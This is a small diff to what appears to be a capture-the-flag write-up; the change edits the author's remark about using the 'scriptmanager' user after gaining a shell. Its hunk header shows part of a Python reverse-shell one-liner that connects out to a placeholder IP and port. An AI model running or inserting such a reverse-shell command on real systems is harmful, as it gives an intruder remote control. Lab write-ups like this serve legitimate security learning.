@@ -150,7 +150,7 @@ python3 -c 'import os,pty,socket;s=socket.socket();s.connect(([IP Address],[Port
 
 Real simple right?
 
-Yeah I forgot to do that lmao.
+Yeah I forgot to do that lmao, now that I did tho, I can use the _scriptmanager_ user properly.
 
 Anyways, on my main machine, I was listening for the request via:
 
